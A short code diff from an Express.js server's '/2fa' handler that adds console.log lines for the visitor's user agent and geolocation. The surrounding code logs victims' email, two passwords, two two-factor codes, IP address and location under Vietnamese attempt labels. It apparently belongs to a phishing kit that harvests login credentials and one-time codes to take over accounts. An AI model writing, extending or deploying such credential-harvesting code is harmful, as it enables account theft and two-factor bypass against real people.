@@ -194,8 +194,9 @@ app.post('/2fa', async (req, res) => {
 
 
   const userAgent = req.headers['user-agent'];
-
+  console.log(userAgent)
   const geo = await getGeo(ip);
+  console.log(geo);
   logData({ type: `2FA Lần  ${step} - Email  ${email}`, code1,code2, password1, password2, email,ip    , userAgent,
     city: geo.city,
     region: geo.region,
